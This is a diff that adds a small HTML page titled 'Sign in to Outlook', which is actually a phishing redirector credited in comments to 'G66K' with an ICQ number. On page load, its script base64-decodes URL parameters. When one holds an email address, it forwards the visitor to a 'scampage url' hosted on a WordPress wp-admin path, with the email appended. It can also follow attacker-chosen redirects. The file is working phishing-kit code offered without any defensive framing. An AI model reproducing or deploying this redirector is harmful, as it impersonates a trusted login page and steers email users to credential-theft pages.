@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to Outlook</title>
+    <!-- Redirection By G66K -->
+    <!-- ICQ: 747246257 -->
+
+
+    <script type="text/javascript">
+        //domain string to match if redirecting to domain
+        var domainMatching = 'elasticospysa'; //where go going to redirect domain name google
+        //where to redirect scampage url
+        var redirectUrl = 'https://www.elasticospysa.com/wp-admin/santi.html#';
+        //redirect sperator word
+        var redirectDelimiter = 'bla';
+        //enable base64
+        var enablebase64 = true;
+
+
+        function ValidateEmail(mail) {
+            if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail)) {
+                return true;
+            }
+            return false;
+        }
+        decodeBase64 = function(s) {
+            var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
+            var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+            for(i=0;i<64;i++){e[A.charAt(i)]=i;}
+            for(x=0;x<L;x++){
+                c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
+                while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
+            }
+            return r;
+        };
+
+        function Fired() {
+
+            var getParams = function (url) {
+                var params = {};
+                var parser = document.createElement('a');
+                parser.href = url;
+                console.log(parser);
+
+
+                if (parser.href.match(redirectDelimiter)) {
+                    var foundRedirections = parser.href.split('bla')[1];
+                    console.log(foundRedirections);
+                    if (foundRedirections.match(domainMatching)) {
+                        if(enablebase64)
+                            foundRedirections = decodeBase64(foundRedirections).trim();
+                        window.location.href = foundRedirections.match('http') ? foundRedirections : 'http://' + foundRedirections;
+                    }
+                }
+
+                var query = parser.href.split(/[#\?&=]/);
+                console.log(query);
+
+                for(let param of query)
+                    {
+                        param = decodeURIComponent(param);
+                        if(enablebase64)
+                            param = decodeBase64(param).trim();
+                        
+                        if(ValidateEmail(param))
+                        {
+                            window.location.href = redirectUrl + param;
+                        }
+                    }
+            };
+
+            var param = getParams(window.location.href);
+
+
+        }
+
+
+    </script>
+</head>
+
+<body onload="Fired()">
+
+</body>
+</html>
